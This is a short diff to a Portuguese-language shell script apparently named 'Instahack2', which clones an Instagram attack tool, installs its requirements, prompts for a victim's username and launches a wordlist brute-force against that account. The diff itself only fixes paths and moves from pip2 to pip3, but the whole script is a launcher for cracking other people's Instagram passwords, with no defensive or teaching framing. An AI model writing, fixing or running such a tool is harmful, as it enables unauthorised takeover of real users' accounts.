@@ -2,7 +2,7 @@
 #
 #
 if [ "oi" = "1" ];then
-find Brute-Force
+find Brute-Force; find Instagram
         echo "Pastas foram encontradas"
 else
         echo "ERRO: Pastas nao foram encontradas"
@@ -11,6 +11,8 @@ git clone https://github.com/Pure-L0G1C/Instagram
 fi
 #
 #
+pkg install python3
+cd Instagram
 clear
 figlet Instahack2
 #
@@ -33,8 +35,7 @@ read -p "[+]=>" vitima
 #Iniciando o ataque
 clear
 figlet START
-cd Instagram
-pip2 install -r requirements.txt
+pip3 install -r requirements.txt
 python3 instagram.py $vitima /$HOME/instahack2/Brute-Force/wordlist/wordlist.txt -m 3
 fi
 exit
